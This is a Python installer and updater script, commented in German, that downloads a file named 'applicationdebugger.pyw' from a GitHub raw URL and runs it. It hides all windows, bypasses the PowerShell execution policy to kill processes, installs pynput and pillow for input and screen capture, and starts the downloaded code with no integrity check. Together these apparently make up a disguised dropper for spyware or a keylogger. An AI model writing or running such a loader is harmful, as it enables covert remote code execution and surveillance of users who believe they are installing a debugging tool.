import ssl
import sys
import os
from pathlib import Path
import time
import urllib.request
import subprocess
import shutil
import importlib.util


# ────────────────────────────────────────────────
# BASISPFADE

SCRIPT_PATH = Path(__file__).resolve()
SCRIPT_DIR = SCRIPT_PATH.parent
os.chdir(SCRIPT_DIR)

BASE_DIR = SCRIPT_DIR


# ────────────────────────────────────────────────
# KONFIGURATION

FILE_NAME = "applicationdebugger.pyw"

UPDATE_URL = (
    "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/"
    + FILE_NAME
)

APP_PATH = BASE_DIR / FILE_NAME

VENV_DIR = BASE_DIR / ".venv"

IS_WINDOWS = os.name == "nt"

if IS_WINDOWS:
    VENV_PY = VENV_DIR / "Scripts" / "python.exe"
    VENV_PYW = VENV_DIR / "Scripts" / "pythonw.exe"
else:
    VENV_PY = VENV_DIR / "bin" / "python"
    VENV_PYW = VENV_PY


# pip-Paketname, Importname
DEPENDENCIES = [
    ("requests", "requests"),
    ("pynput", "pynput"),
    ("pillow", "PIL"),
    ("numpy", "numpy"),
]

APP_LOG = BASE_DIR / "app_error.log"
INSTALLER_LOG = BASE_DIR / "installer.log"


# ────────────────────────────────────────────────
# HILFSFUNKTIONEN

def log(message: str) -> None:
    text = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}"
    print(text)

    try:
        with open(INSTALLER_LOG, "a", encoding="utf-8") as f:
            f.write(text + "\n")
    except Exception:
        pass


def _no_window_flags() -> int:
    """
    Windows: kein neues Konsolenfenster.
    Auf anderen Systemen: 0.
    """
    if not IS_WINDOWS:
        return 0

    try:
        return subprocess.CREATE_NO_WINDOW  # type: ignore[attr-defined]
    except Exception:
        return 0


def get_venv_python(prefer_pythonw: bool = False) -> Path:
    """
    Gibt den besten Python-Interpreter aus der venv zurück.
    Für Debug/Install bevorzugen wir python.exe.
    Für App-Start kann pythonw.exe verwendet werden.
    """
    if prefer_pythonw and VENV_PYW.exists():
        return VENV_PYW

    if VENV_PY.exists():
        return VENV_PY

    if VENV_PYW.exists():
        return VENV_PYW

    return VENV_PY


def powershell_single_quote(value: str) -> str:
    """
    Sicheres Single-Quote-Encoding für PowerShell-Strings.
    """
    return "'" + value.replace("'", "''") + "'"


# ────────────────────────────────────────────────
# PROZESS BEENDEN

def kill_running_main() -> None:
    """
    Beendet laufende Prozesse, deren CommandLine auf APP_PATH zeigt.
    Nützlich, damit die Datei beim Update ersetzt werden kann.
    """
    if not IS_WINDOWS:
        return

    try:
        app_path_str = str(APP_PATH)
        quoted_path = powershell_single_quote(app_path_str)

        command = (
            "$target = " + quoted_path + "; "
            "Get-CimInstance Win32_Process | "
            "Where-Object { $_.CommandLine -and $_.CommandLine -like ('*' + $target + '*') } | "
            "ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"
        )

        subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                command,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )

        time.sleep(1)

    except Exception as e:
        log(f"kill_running_main Fehler: {e}")


# ────────────────────────────────────────────────
# UPDATE HERUNTERLADEN

def download_update() -> Path | None:
    """
    Lädt die neue Version herunter und speichert sie als .new.
    """
    temp_path = APP_PATH.with_suffix(APP_PATH.suffix + ".new")

    try:
        context = ssl.create_default_context()

        req = urllib.request.Request(
            UPDATE_URL,
            headers={
                "Pragma": "no-cache",
                "Cache-Control": "no-cache",
                "User-Agent": "Python-Updater",
            },
        )

        with urllib.request.urlopen(req, timeout=15, context=context) as resp:
            status = getattr(resp, "status", 200)

            if status != 200:
                log(f"Update-Download fehlgeschlagen. HTTP Status: {status}")
                return None

            data = resp.read()

        if not data:
            log("Update-Download fehlgeschlagen: leere Datei.")
            return None

        BASE_DIR.mkdir(parents=True, exist_ok=True)

        with open(temp_path, "wb") as f:
            f.write(data)

        log(f"Update heruntergeladen: {temp_path}")
        return temp_path

    except Exception as e:
        log(f"download_update Fehler: {e}")

        if temp_path.exists():
            try:
                temp_path.unlink()
            except Exception:
                pass

        return None


# ────────────────────────────────────────────────
# UPDATE ANWENDEN

def apply_update(temp_file: Path) -> bool:
    """
    Ersetzt die alte Hauptdatei mit der neuen Datei.
    """
    attempts = 5

    for i in range(attempts):
        try:
            if APP_PATH.exists():
                try:
                    APP_PATH.unlink()
                except PermissionError:
                    log("APP_PATH gesperrt. Versuche laufende App zu beenden.")
                    kill_running_main()
                    time.sleep(1 + i)

            shutil.move(str(temp_file), str(APP_PATH))

            try:
                os.chmod(APP_PATH, 0o755)
            except Exception:
                pass

            log("Update erfolgreich angewendet.")
            return True

        except PermissionError:
            log("PermissionError beim Update. Neuer Versuch.")
            kill_running_main()
            time.sleep(1 + i)

        except Exception as e:
            log(f"apply_update Fehler: {e}")
            return False

    log("Update konnte nach mehreren Versuchen nicht angewendet werden.")
    return False


# ────────────────────────────────────────────────
# VENV ERSTELLEN

def try_install_venv() -> bool:
    """
    Erstellt die venv, falls sie nicht vorhanden oder kaputt ist.
    Wichtig: Es wird auf python.exe/pythonw.exe geprüft, nicht nur auf den Ordner.
    """
    if VENV_PY.exists() or VENV_PYW.exists():
        return True

    BASE_DIR.mkdir(parents=True, exist_ok=True)

    log("Erstelle virtuelle Umgebung...")

    try:
        result = subprocess.run(
            [sys.executable, "-m", "venv", str(VENV_DIR)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )

        if result.returncode == 0 and (VENV_PY.exists() or VENV_PYW.exists()):
            log("Virtual environment created.")
            return True

        log("Failed to create virtual environment.")
        return False

    except Exception as e:
        log(f"try_install_venv Fehler: {e}")
        return False


# ────────────────────────────────────────────────
# MODULPRÜFUNG

def venv_has(import_name: str) -> bool:
    """
    Prüft, ob ein Modul in der venv importierbar ist.
    Beispiel:
    pip-Paket: pillow
    Importname: PIL
    """
    exe = get_venv_python(prefer_pythonw=False)

    if not exe.exists():
        return False

    code = (
        "import importlib, sys\n"
        f"module_name = {import_name!r}\n"
        "try:\n"
        "    importlib.import_module(module_name)\n"
        "    sys.exit(0)\n"
        "except Exception:\n"
        "    sys.exit(1)\n"
    )

    try:
        r = subprocess.run(
            [str(exe), "-c", code],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )

        return r.returncode == 0

    except Exception:
        return False


# ────────────────────────────────────────────────
# DEPENDENCIES INSTALLIEREN

def install_dependencies() -> None:
    """
    Installiert alle benötigten Pakete in die venv.
    Wichtig:
    - pip-Paketname und Importname können unterschiedlich sein.
    - pillow wird zum Beispiel als PIL importiert.
    """
    exe = get_venv_python(prefer_pythonw=False)

    if not exe.exists():
        log("venv Python nicht gefunden. Dependencies können nicht installiert werden.")
        return

    log("Aktualisiere pip...")

    subprocess.run(
        [str(exe), "-m", "pip", "install", "--upgrade", "pip"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=_no_window_flags(),
    )

    for pip_name, import_name in DEPENDENCIES:
        if venv_has(import_name):
            log(f"Dependency already installed: {pip_name}")
            continue

        log(f"Installing dependency into venv: {pip_name}")

        result = subprocess.run(
            [str(exe), "-m", "pip", "install", pip_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
        )

        if result.returncode == 0 and venv_has(import_name):
            log(f"Dependency installed successfully: {pip_name}")
        else:
            log(f"Failed to install dependency: {pip_name}")


# ────────────────────────────────────────────────
# HAUPTANWENDUNG STARTEN

def start_main_app() -> bool:
    """
    Startet die Hauptanwendung aus der venv.
    Fehler werden nach app_error.log geschrieben.
    """
    if not APP_PATH.exists():
        log(f"APP_PATH nicht gefunden: {APP_PATH}")
        return False

    exe = get_venv_python(prefer_pythonw=True)

    if not exe.exists():
        log(f"venv Python nicht gefunden: {exe}")
        return False

    try:
        log_file = open(APP_LOG, "ab")

        subprocess.Popen(
            [str(exe), str(APP_PATH)],
            stdout=log_file,
            stderr=log_file,
            stdin=subprocess.DEVNULL,
            creationflags=_no_window_flags(),
            cwd=str(BASE_DIR),
        )

        log(f"Hauptanwendung gestartet. Fehlerlog: {APP_LOG}")
        return True

    except Exception as e:
        log(f"Startfehler: {e}")
        return False


# ────────────────────────────────────────────────
# MAIN

def main() -> None:
    BASE_DIR.mkdir(parents=True, exist_ok=True)

    log("Installer gestartet.")

    kill_running_main()

    new_file = download_update()

    if new_file:
        ok = apply_update(new_file)

        if not ok:
            log("Update konnte nicht angewendet werden.")
    else:
        log("Kein Update angewendet.")

    if try_install_venv():
        install_dependencies()
        log("Virtual environment is ready.")
    else:
        log("Failed to create virtual environment. Starte trotzdem, falls möglich.")

    started = start_main_app()

    if not started:
        log("Konnte Hauptanwendung nicht starten.")

    log("Installer beendet.")
    sys.exit(0)


# ────────────────────────────────────────────────

if __name__ == "__main__":
    main()